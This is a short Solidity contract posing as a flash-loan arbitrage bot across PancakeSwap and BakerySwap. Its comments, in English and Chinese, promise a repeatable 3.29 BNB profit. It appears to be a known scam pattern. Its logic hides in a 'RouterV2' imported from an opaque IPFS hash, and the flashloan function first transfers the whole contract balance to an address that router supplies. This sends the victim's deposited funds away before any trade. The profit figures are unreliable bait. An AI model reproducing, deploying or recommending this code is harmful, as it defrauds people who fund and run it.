pragma solidity ^0.5.0;

// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

//BakerySwp Smart contracts
import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";

// Router
import "ipfs://QmUSQQNWBJ6snmx5FvafDSBCPCy63BLTpwM61dYjRzwLkN";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

contract InitiateFlashLoan {
  RouterV2 router;
  string public tokenName;
  string public tokenSymbol;
  uint256 flashLoanAmount;

  constructor(
    string memory _tokenName,
    string memory _tokenSymbol,
    uint256 _loanAmount
  ) public {
    tokenName = _tokenName;
    tokenSymbol = _tokenSymbol;
    flashLoanAmount = _loanAmount;
    router = new RouterV2();
  }

  function() external payable {}

  function flashloan() public payable {
    // Send required coins for swap
    // 发送交换所需的硬币
    address(uint160(router.pancakeSwapAddress())).transfer(
      address(this).balance
    );

    // Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
    // Flash loan从Multiplier Finance借款3137.41 BNB，在AMM DEX PancakeSwap上进行套利交易。
    router.borrowFlashloanFromMultiplier(
      address(this),
      router.bakerySwapAddress(),
      flashLoanAmount
    );

    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
    // 为了准备套利，使用PancakeSwap掉期合约将BNB转换为BUSD。
    router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);

    // The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
    // 套利使用BUSD/BNB PancakeSwap将BUSD转换为BNB，然后立即使用BNB/BUSD BakerySwap将BNB转换回3148.39 BNB。
    router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);

    // After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
    // 套利后，3148.38 BNB被转回乘数，用于支付贷款和费用。这笔交易花费了0.2 BNB的天然气。
    router.transferBnbToMultiplier(router.pancakeSwapAddress());

    // Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
    // 请注意，交易发送方从套利中获得3.29 BNB，这一特定交易可以随着价格的不断变化而重复。
    router.completeTransation(address(this).balance);
  }
}